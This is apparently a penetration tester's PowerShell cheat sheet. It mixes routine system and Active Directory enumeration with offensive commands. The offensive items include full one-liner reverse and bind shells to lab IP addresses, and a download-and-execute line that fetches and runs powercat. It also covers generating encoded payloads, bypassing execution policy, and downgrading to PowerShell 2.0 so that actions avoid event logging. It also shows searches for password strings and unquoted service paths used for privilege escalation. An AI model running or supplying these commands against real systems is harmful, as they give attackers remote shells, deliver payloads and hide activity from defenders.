### Get installed software
Get-WmiObject -Class Win32_Product

### Get Antivirus Product Status
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

### In table format, display processes and include the CommandLine, ProcessName, and SessionID. Filter to show SessionID of 2 and ProcessName of "svchost.exe" only. Sort the results alphabetically by CommandLine.
gps | Select-Object -Property ProcessName,SessionID | Sort-Object -Property ProcessName -Descending | Where-Object SessionID -EQ 2 | Where-Object ProcessName -EQ svchost.exe | Format-Table

### Services with unquoted executable paths that start automatically can lead to escalating privileges. How many services fit that description on this machine?
Get-WmiObject -class Win32_Service -Property StartMode,PathName | Where {$_.StartMode -EQ "Auto" -and $_.PathName -notlike '"*'} | select StartMode,PathName

### Get current logged in user
query user /server:$server
Get-WmiObject -Class win32_computersystem
(Get-CimInstance -ClassName Win32_ComputerSystem).Username
(Get-WMIObject -ClassName Win32_ComputerSystem).Username


### Get file under path using hash value
Get-FileHash -Path C:\Windows\System32\* -Algorithm MD5 | findstr /i "6CECC33A62E935F5E8665B9597479A36"

### Find string in txt files under path by "password" string
Select-String -Path C:\Windows\System32\*.txt -Pattern 'password'

### Powershell to get shell from 192.168.79.79 to 192.168.79.80(username:offensive)
192.168.79.79:Enable-PSRemoting,Set-Item wsman:\localhost\client\trustedhosts 192.168.79.80,Enter-PSSession -ComputerName 192.168.79.80 -Credential offensive

### Domain
###### Domain Users and Groups
Get-ADUser Jim  
Get-ADUSer -filter *  
Get-ADUser Morgan -Properties *(get full info of aduser)  
Get-ADComputer APPSRV01  
Get-ADGroup -filter 'GroupScope -eq Global/Domain Local/Universal'  
Get-ADGroup -filter * -properties * |select SAMAccountName, Description|Export-Csv adGroupList.csv  

###### Enumerate Domain group member
Get-ADGroupMember ThirdGroup -recursive 

### Get windows firewall rules
Get-NetFirewallRule

### Retrieve domain user full info
Get-ADUser -Identity Susan -Properties "*"

### Retrieve domain computer full info
Get-AdComputer -Identity APPSRV01 -Properties *

### display all loaded functions
dir function:

### display one specific module location
dir (Get-Module -ListAvailable FlagModule).ModuleBase

### download file
>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
powershell -nop -Exec Bypass -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"  

### reverse shell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
sudo nc -lnvp 443
```
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
```
download Invoke-PowerShellTcp.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.9.1.100 -Port 4443
```
### bind shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
nc -nv 10.11.0.22 443
```
### load powercat, bindshell, reverse shell, encrypted payloads
>Generally speaking, Windows PowerShell uses Unicode UTF-16LE encoding by default. However, the default encoding used by cmdlets in Windows PowerShell is inconsistent.
```
powercat.ps1
  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>
```
```
Import-Module .\powercat.ps1
powercat -l -p 443 -e cmd.exe
powercat -c 10.11.0.4 -p 443 -e cmd.exe
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E en_payload
```
### Allow unsigned scripts execute
```
powershell -ExecutionPolicy Bypass -File admin_login.ps1
```
### ps1 cannot be loaded because running scripts is disabled on this system
```
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -scope currentuser
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -scope LocalMachine 
```
### Downgrade
>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer
```
powershell.exe -version 2
```
